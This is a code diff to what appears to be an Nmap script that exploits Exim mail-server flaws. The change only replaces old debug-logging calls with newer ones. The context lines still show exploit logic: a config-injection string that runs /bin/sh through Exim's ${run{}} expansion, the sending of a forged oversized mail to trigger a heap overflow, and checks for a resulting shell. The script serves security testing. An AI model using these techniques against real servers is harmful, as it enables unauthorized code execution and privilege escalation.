@@ -111,8 +111,7 @@ local function escalate_privs(socket, smtp_opts)
   local exim_spool = "spool_directory = \\${run{/bin/sh -c 'id > "..
   tmp_file.."' }}"
 
-  stdnse.print_debug(2, "%s: trying to escalate privileges",
-    SCRIPT_NAME)
+  stdnse.debug2("trying to escalate privileges")
 
   local status, ret = send_recv(socket, "id\n")
   if not status then
@@ -145,9 +144,7 @@ local function escalate_privs(socket, smtp_opts)
     exploited = true
     results = results..string.format("\n    After  'id': %s",
       string.gsub(ret, "^%$*%s*(.-)\n*%$*$", "%1"))
-    stdnse.print_debug(2,
-      "%s: successfully exploited the Exim privileges escalation.",
-      SCRIPT_NAME)
+    stdnse.debug2("successfully exploited the Exim privileges escalation.")
   end
 
   -- delete tmp file, should we care about this ?
@@ -163,8 +160,7 @@ end
 local function exploit_heap(socket, smtp_opts)
   local exploited, ret = false, ""
 
-  stdnse.print_debug(2, "%s: exploiting the heap overflow",
-    SCRIPT_NAME)
+  stdnse.debug2("exploiting the heap overflow")
 
   local status, response = smtp.mail(socket, smtp_opts.mailfrom)
   if not status then
@@ -230,8 +226,7 @@ local function exploit_heap(socket, smtp_opts)
     return status, msg
   end
 
-  stdnse.print_debug(1, "%s: sending forged mail, size: %dMB",
-    SCRIPT_NAME, msg_len / (1024*1024))
+  stdnse.debug1("sending forged mail, size: %dMB", msg_len / (1024*1024))
 
   -- use low socket level functions.
   status, ret = socket:send(hdrs)
@@ -278,8 +273,7 @@ local function exploit_heap(socket, smtp_opts)
     end
   end
 
-  stdnse.print_debug(2, "%s: the forged mail was sent successfully.",
-    SCRIPT_NAME)
+  stdnse.debug2("the forged mail was sent successfully.")
 
   -- second round
   status, response = smtp.query(socket, "MAIL",
@@ -295,8 +289,7 @@ local function exploit_heap(socket, smtp_opts)
   end
 
   if response:match("sh:%s") or ret:match("sh:%s") then
-    stdnse.print_debug(2,
-      "%s: successfully exploited the Exim heap overflow.", SCRIPT_NAME)
+    stdnse.debug2("successfully exploited the Exim heap overflow.")
     exploited = "heap-exploited"
   end
 
